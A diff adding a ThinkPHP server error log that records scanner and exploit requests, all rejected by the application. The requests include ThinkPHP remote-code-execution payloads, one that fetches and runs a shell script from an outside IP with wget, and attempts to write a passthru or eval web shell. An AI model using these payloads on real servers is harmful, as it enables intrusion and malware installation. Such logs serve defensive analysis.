@@ -1,0 +1,87 @@
+[ 2019-01-22T01:28:11+08:00 ] 95.179.166.114 /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http://185.62.188.233/a.sh;%20chmod%20+x%20a.sh;%20sh%20a.sh%20
+ERR: 非法操作:\think\app
+
+[ 2019-01-22T04:40:34+08:00 ] 124.202.205.2 /webdav/
+ERR: 无法加载控制器:Webdav
+
+[ 2019-01-22T04:40:40+08:00 ] 124.202.205.2 /manager/html
+ERR: 无法加载控制器:Manager
+
+[ 2019-01-22T06:55:00+08:00 ] 171.221.208.10 /?s=captcha
+ERR: 无法加载控制器:Captcha
+
+[ 2019-01-22T06:55:00+08:00 ] 171.221.208.10 /?s=captcha&test=echo%20zxcvvbnm
+ERR: 无法加载控制器:Captcha
+
+[ 2019-01-22T06:55:00+08:00 ] 171.221.208.10 /?s=captcha&test=phpinfo()
+ERR: 无法加载控制器:Captcha
+
+[ 2019-01-22T06:55:00+08:00 ] 171.221.208.10 /?s=captcha&test=1
+ERR: 无法加载控制器:Captcha
+
+[ 2019-01-22T06:55:01+08:00 ] 171.221.208.10 /?s=index/%5Cthink%5Cconfig/get&name=database.resultset_type
+ERR: 非法操作:\think\config
+
+[ 2019-01-22T06:55:01+08:00 ] 171.221.208.10 /?s=.%7Cthink%5Cconfig/get&name=database.resultset_type
+ERR: 无法加载控制器:.|think\config
+
+[ 2019-01-22T06:55:01+08:00 ] 171.221.208.10 /?s=index/%5Cthink%5Capp/invokefunction&function=phpinfo&vars%5B0%5D=1
+ERR: 非法操作:\think\app
+
+[ 2019-01-22T06:55:01+08:00 ] 171.221.208.10 /?s=index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=phpinfo&vars%5B1%5D%5B%5D=1
+ERR: 非法操作:\think\app
+
+[ 2019-01-22T06:55:01+08:00 ] 171.221.208.10 /?s=index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=assert&vars%5B1%5D%5B%5D=phpinfo()
+ERR: 非法操作:\think\app
+
+[ 2019-01-22T06:55:01+08:00 ] 171.221.208.10 /?s=index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=system&vars%5B1%5D%5B%5D=echo%20zxcvvbnm
+ERR: 非法操作:\think\app
+
+[ 2019-01-22T06:55:02+08:00 ] 171.221.208.10 /?s=index/%5Cthink%5CRequest/cache&key=echo%20zxcvvbnm%7Csystem
+ERR: 非法操作:\think\Request
+
+[ 2019-01-22T06:55:02+08:00 ] 171.221.208.10 /?s=index/%5Cthink%5CRequest/cache&key=1%7Cphpinfo
+ERR: 非法操作:\think\Request
+
+[ 2019-01-22T06:55:02+08:00 ] 171.221.208.10 /?s=index/%5Cthink%5CView/display&content=%3C?php%20phpinfo();?%3E&data=1
+ERR: 非法操作:\think\View
+
+[ 2019-01-22T06:55:02+08:00 ] 171.221.208.10 /?s=index/%5Cthink%5CRequest/input?filter=assert&data%5B%5D=phpinfo()
+ERR: 非法操作:\think\Request
+
+[ 2019-01-22T06:55:02+08:00 ] 171.221.208.10 /?s=index/%5Cthink%5CRequest/input&filter=system&data=echo%20zxcvvbnm
+ERR: 非法操作:\think\Request
+
+[ 2019-01-22T06:55:02+08:00 ] 171.221.208.10 /?s=index/%5Cthink%5CRequest/input&filter=phpinfo&data=1
+ERR: 非法操作:\think\Request
+
+[ 2019-01-22T06:55:02+08:00 ] 171.221.208.10 /?s=index/%5Cthink%5CContainer/invokefunction&function=call_user_func_array&vars%5B0%5D=phpinfo&vars%5B1%5D%5B%5D=1
+ERR: 非法操作:\think\Container
+
+[ 2019-01-22T06:55:02+08:00 ] 171.221.208.10 /?s=captcha&test=@eval($_POST%5Ba%5D);
+ERR: 无法加载控制器:Captcha
+
+[ 2019-01-22T15:04:49+08:00 ] 122.114.254.38 /webdav/
+ERR: 无法加载控制器:Webdav
+
+[ 2019-01-22T15:05:36+08:00 ] 122.114.254.38 /manager/html
+ERR: 无法加载控制器:Manager
+
+[ 2019-01-22T19:12:48+08:00 ] 111.160.187.54 /nmaplowercheck1548154392
+ERR: 无法加载控制器:Nmaplowercheck1548154392
+
+[ 2019-01-22T19:12:48+08:00 ] 111.160.187.54 /evox/about
+ERR: 无法加载控制器:Evox
+
+[ 2019-01-22T19:12:48+08:00 ] 111.160.187.54 /HNAP1
+ERR: 无法加载控制器:HNAP1
+
+[ 2019-01-22T19:12:49+08:00 ] 111.160.187.54 /sdk
+ERR: 无法加载控制器:Sdk
+
+[ 2019-01-22T23:10:03+08:00 ] 51.68.173.240 /?s=index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20%22%3C?php%20echo%20passthru(%5C$_GET['cmd']);%20?%3E%22%20%3Eplay.php
+ERR: 非法操作:\think\app
+
+[ 2019-01-22T23:10:07+08:00 ] 51.68.173.240 /?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=echo%20%22%3C?php%20echo%20passthru(%5C$_GET['cmd']);%20?%3E%22%20%3Eplay.php
+ERR: 非法操作:\think\app
+
